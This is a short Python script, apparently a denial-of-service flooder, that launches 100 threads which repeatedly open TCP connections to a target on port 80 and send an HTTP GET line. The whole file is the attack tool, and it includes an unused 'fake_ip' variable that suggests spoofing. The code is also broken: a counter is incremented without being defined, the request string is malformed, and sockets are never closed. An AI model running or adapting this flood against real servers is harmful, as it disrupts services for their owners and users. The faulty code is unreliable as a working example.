import socket
import threading

target = ''
fake_ip = '182.59.20.31'
port = 80



def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET/" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        i += 1
        print(i)

for i in range(100):
    thread = threading.Thread(target = attack)
    thread.start()

